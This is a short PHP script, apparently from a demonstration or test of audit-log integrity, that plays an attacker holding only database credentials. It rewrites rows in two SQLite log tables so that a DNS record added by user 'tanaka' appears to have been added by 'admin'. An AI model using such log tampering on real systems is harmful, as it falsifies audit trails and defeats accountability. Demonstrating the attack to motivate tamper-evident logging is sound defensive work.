<?php

// The attacker of scene 2: has the database credentials, nothing else. Rewrites one log row
// so that the record tanaka added appears to have been added by admin.
//
//   php attack-rows.php <database file>

$db = new PDO('sqlite:' . $argv[1]);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$changed = $db->exec("UPDATE log_zones SET event = replace(event, 'user:tanaka', 'user:admin') WHERE event LIKE '%user:tanaka%record:mail.example.net%'");
$changed += $db->exec("UPDATE log_record_changes SET username = 'admin', user_id = 1 WHERE username = 'tanaka'");
echo "rewrote $changed log rows directly in the database\n";
